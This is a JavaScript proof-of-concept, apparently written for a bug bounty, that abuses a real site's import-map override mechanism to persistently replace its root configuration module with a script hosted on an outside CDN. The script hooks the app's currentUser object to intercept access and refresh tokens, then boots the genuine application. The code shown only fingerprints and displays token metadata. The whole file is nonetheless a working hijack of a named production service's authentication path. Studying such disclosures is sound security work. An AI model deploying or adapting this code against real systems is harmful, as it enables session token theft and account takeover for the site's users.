/*
 * FW-08 safe token-path validator - AUTHORISED BUG BOUNTY TESTING ONLY.
 *
 * This module is intended to replace @fastweb-tmt/root-config through FW-08.
 * It hooks the shared currentUser singleton, then boots Fastweb's genuine root
 * configuration. If genuine authentication succeeds, it records only token
 * presence, length, JWT shape and a short SHA-256 fingerprint in this page.
 *
 * It never stores, displays, logs or transmits a token. It performs no callback.
 */
(function () {
  "use strict";

  var SELF = "https://cdn.jsdelivr.net/gh/89p1rPWN/fw08-poc@main/fw08-token-hook-safe.js";
  var REAL_ROOT = "https://bricks.fastweb.it//fe-app-shell/fastweb-tmt-root-config.js";
  var state = window.__FW08_TOKEN_PROOF__ = {
    marker: "fw08-token-hook-safe",
    origin: location.origin,
    utilityLoaded: false,
    genuineRootStarted: false,
    accessTokenObserved: false,
    refreshTokenObserved: false
  };

  function render() {
    var existing = document.getElementById("fw08-token-proof");
    if (existing) existing.remove();
    var box = document.createElement("pre");
    box.id = "fw08-token-proof";
    box.style.cssText = "position:fixed;right:12px;bottom:12px;z-index:2147483647;" +
      "max-width:560px;padding:14px;background:#101827;color:#d7e2f0;border:2px solid #39d98a;" +
      "font:13px/1.45 monospace;white-space:pre-wrap";
    box.textContent = "FW-08 safe token-path validator\n" + JSON.stringify(state, null, 2);
    (document.body || document.documentElement).appendChild(box);
  }

  async function fingerprint(value) {
    var bytes = new TextEncoder().encode(String(value));
    var digest = await crypto.subtle.digest("SHA-256", bytes);
    return Array.from(new Uint8Array(digest)).slice(0, 6)
      .map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
  }

  async function record(kind, value) {
    if (!value) return;
    var key = kind === "access" ? "accessToken" : "refreshToken";
    state[key + "Observed"] = true;
    state[key + "Metadata"] = {
      length: String(value).length,
      jwtSegments: String(value).split(".").length,
      sha256Prefix: await fingerprint(value)
    };
    render();
  }

  try {
    if (window.importMapOverrides && window.importMapOverrides.addOverride) {
      window.importMapOverrides.addOverride("@fastweb-tmt/root-config", SELF);
      state.overridePersisted = true;
    }
  } catch (error) {
    state.overridePersisted = false;
    state.overrideError = String(error);
  }

  render();

  // The genuine application mounts after this module runs, so keep the proof box
  // attached for a minute in case the app's own render clears the body.
  var keepAlive = setInterval(function () {
    if (!document.getElementById("fw08-token-proof")) render();
  }, 1000);
  setTimeout(function () { clearInterval(keepAlive); }, 60000);

  System.import("@fastweb-tmt/utils").then(function (utils) {
    var user = utils.currentUser;
    state.utilityLoaded = true;

    var originalSetToken = user.setToken.bind(user);
    var originalSetRefreshToken = user.setRefreshToken.bind(user);

    user.setToken = function (value) {
      originalSetToken(value);
      record("access", value).catch(function () {});
    };
    user.setRefreshToken = function (value) {
      originalSetRefreshToken(value);
      record("refresh", value).catch(function () {});
    };

    if (user.authToken) record("access", user.authToken).catch(function () {});
    if (user.refreshToken) record("refresh", user.refreshToken).catch(function () {});
    render();

    state.genuineRootStarted = true;
    render();
    return System.import(REAL_ROOT);
  }).catch(function (error) {
    state.error = String(error);
    render();
  });
})();
